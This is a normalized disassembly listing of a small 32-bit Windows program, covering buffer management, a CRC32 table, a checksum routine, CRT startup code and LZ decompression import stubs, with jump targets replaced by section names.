mov [ edx + 0x8398 ] ecx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + 0x838c ]
sub eax [ edx + 0x8398 ]
mov [ ebp - 0x4 ] eax
sub_4042cb
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x8388 ]
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
add edx [ ecx + 0x839c ]
mov eax [ ebp - 0x10 ]
cmp edx [ eax + 0x8390 ]
jle r-xdata
mov eax [ ebp + 0xc ]
imul eax eax 0x3
cdq
sub eax edx
sar eax 0x1
add eax 0x400
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x8390 ] eax
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x8390 ]
push eax
call [ malloc@IAT ]
add esp 0x4
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x8388 ]
mov [ edx ] eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8388 ]
cmp [ ecx ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8388 ]
mov edx [ ecx ]
mov eax [ ebp - 0x10 ]
add edx [ eax + 0x839c ]
push edx
call memcpy
add esp 0xc
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x839c ]
add edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov [ eax + 0x839c ] edx
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x8394 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x839c ]
mov [ edx ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x839c ]
add eax [ ebp - 0x4 ]
imul eax eax 0x3
cdq
sub eax edx
sar eax 0x1
add eax 0x400
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
push edx
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x8390 ]
push eax
push 0x0
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x8388 ]
mov eax [ edx ]
push eax
call memset
add esp 0xc
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call memset
add esp 0xc
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x839c ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x8388 ]
mov eax [ edx ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x8388 ]
mov ecx [ eax ]
push ecx
call [ free@IAT ]
add esp 0x4
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x8388 ]
mov ecx [ ebp - 0xc ]
mov [ eax ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x8390 ] eax
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn 0x8
sub_404464
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_40424f
cmp eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_404493
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x1
lea eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_4042cb
cmp eax 0x1
je r-xdata
xor eax eax
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
sub_4044ba
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x8384 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x838c ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
mov [ ecx + 0x8388 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x8394 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8398 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x839c ] 0x0
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x8388 ]
mov [ edx ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8394 ]
mov [ ecx ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8376 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8378 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x837a ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x837c ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
call sub_403d55
xor eax eax
mov esp ebp
pop ebp
retn 0x10
sub_40456d
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x8384 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x838c ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
mov [ ecx + 0x8388 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x8394 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8398 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x839c ] 0x0
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x8388 ]
mov [ edx ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8394 ]
mov [ ecx ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8376 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8378 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x837a ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x837c ] 0x0
mov ecx [ ebp - 0x4 ]
call sub_404071
xor eax eax
mov esp ebp
pop ebp
retn 0x10
sub_404618
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ecx
call [ free@IAT ]
add esp 0x4
mov edx [ ebp + 0x8 ]
mov [ edx ] 0x0
xor eax eax
mov esp ebp
pop ebp
retn 0x4
sub_40463f
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0xedb88320
push 0x400
call [ malloc@IAT ]
add esp 0x4
mov ecx [ ebp - 0x14 ]
mov [ ecx ] eax
mov edx [ ebp - 0x14 ]
cmp [ edx ] 0x0
jne r-xdata
push 0x400
push 0x0
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
push ecx
call memset
add esp 0xc
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0xc ] 0x100
jge r-xdata
mov eax [ ebp - 0x14 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x10 ] 0x8
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ edx ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov [ eax + ecx * 4 ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
and edx 0x1
test edx edx
je r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x8 ]
shr ecx 0x1
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
shr eax 0x1
xor eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
sub ecx 0x1
mov [ ebp - 0x10 ] ecx
jmp r-xdata
sub_4046f2
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ ecx ] 0xffffffff
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
not eax
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
shr edx 0x8
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x8 ]
xor ecx ecx
mov cl [ eax ]
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
and eax 0xff
xor ecx eax
mov eax [ ebp - 0xc ]
mov eax [ eax ]
xor edx [ eax + ecx * 4 ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
sub_404777
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
add ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
add edx 0x4
mov [ ebp + 0x8 ] edx
mov eax [ ebp + 0xc ]
sub eax 0x4
mov [ ebp + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0x10
mov edx [ ebp - 0x4 ]
and edx 0xffff
add ecx edx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
shr eax 0x10
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
not eax
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x3
jle r-xdata
sub_4047ee
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
push eax
call [ malloc@IAT ]
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
add eax 0x3e8
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
sub_40484b
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x8 ]
push edx
call [ free@IAT ]
add esp 0x4
sub_40486f
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x4 ]
add edx [ ebp + 0xc ]
mov eax [ ebp - 0x10 ]
cmp edx [ eax ]
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp - 0x10 ]
add eax [ ecx + 0x4 ]
push eax
call memcpy
add esp 0xc
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x4 ]
add eax [ ebp + 0xc ]
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x4 ] eax
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x8 ]
add ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x4 ]
jbe r-xdata
mov eax [ ebp - 0x4 ]
push eax
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ecx ]
push edx
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
call memcpy
add esp 0xc
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
push ecx
call [ free@IAT ]
add esp 0x4
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov [ edx + 0x8 ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ ecx ] edx
mov edx [ ebp - 0x4 ]
add edx 0x3e8
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_404980
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_404b35
cmp [ rw-data ] ebx
jne r-xdata
call sub_404b20
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_404b32
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_402c6b
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401b38
push ebp
mov ebp esp
call sub_401ab2
push 0x0
call [ ExitProcess@IAT ]
sub_402c90
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40492e
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] 0x0
mov esp ebp
pop ebp
retn
LZClose
jmp [ LZClose@IAT ]
LZCopy
jmp [ LZCopy@IAT ]
LZOpenFileA
jmp [ LZOpenFileA@IAT ]
memcpy
jmp [ memcpy@IAT ]
strlen
jmp [ strlen@IAT ]
strcpy
jmp [ strcpy@IAT ]
memset
jmp [ memset@IAT ]
strcat
jmp [ strcat@IAT ]
strcmp
jmp [ strcmp@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_404b20
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_404b32
xor eax eax
retn
sub_404b35
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
